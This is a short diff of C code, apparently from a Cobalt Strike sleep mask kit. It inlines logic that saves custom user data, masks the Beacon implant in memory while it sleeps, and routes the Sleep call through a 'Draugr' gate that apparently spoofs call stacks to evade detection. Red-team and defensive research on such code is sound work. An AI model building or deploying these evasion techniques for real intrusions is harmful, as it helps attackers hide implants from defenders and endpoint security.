@@ -87,7 +87,44 @@ extern "C" {
         // [2] Route the call.
         if (info->reason == DEFAULT_SLEEP || info->reason == PIVOT_SLEEP) {
             DLOGF("SLEEPMASK: Sleeping\n");
-            SleepMaskWrapper(info);
+            //SleepMaskWrapper(info);
+
+			DFR_LOCAL(KERNEL32, Sleep);
+			// Save any custom user data prior to masking Beacon
+			CUSTOM_USER_DATA customUserData;
+			_memset(&customUserData, 0, sizeof(CUSTOM_USER_DATA));
+			char* customUserDataPtr = BeaconGetCustomUserData();
+			if (customUserDataPtr != NULL) {
+				_memcpy(&customUserData, customUserDataPtr, sizeof(CUSTOM_USER_DATA));
+			}
+		
+			// Mask Beacon
+			MaskBeacon(&info->beacon_info);
+
+			// Sleep
+			if (info->reason == DEFAULT_SLEEP) {
+				DLOGF("SLEEPMASK: Default sleep (HTTP/HTTPS/DNS)\n");
+				//Sleep(info->sleep_time);
+                FUNCTION_CALL sleepFuncCall;
+                _memset(&sleepFuncCall, 0, sizeof(FUNCTION_CALL));
+                sleepFuncCall.functionPtr = Sleep;
+                sleepFuncCall.function = SLEEP;
+                sleepFuncCall.numOfArgs = 1;
+                sleepFuncCall.args[0] = info->sleep_time;
+                sleepFuncCall.bMask = FALSE;
+
+                draugrCall.FunctionCall = &sleepFuncCall;
+                DraugrGateWrapper(info, &draugrCall);
+                draugrCall.FunctionCall = NULL;
+			}
+			else if (info->reason == PIVOT_SLEEP) {
+				DLOGF("SLEEPMASK: Pivot sleep (SMB/TCP)\n");
+				PivotSleep(info, &customUserData);
+			}
+
+			// UnMask Beacon
+			UnMaskBeacon(&info->beacon_info);
+	 
         }
         else if (info->reason == BEACON_GATE) {
             // Attach the passed function call to our Draugr struct.
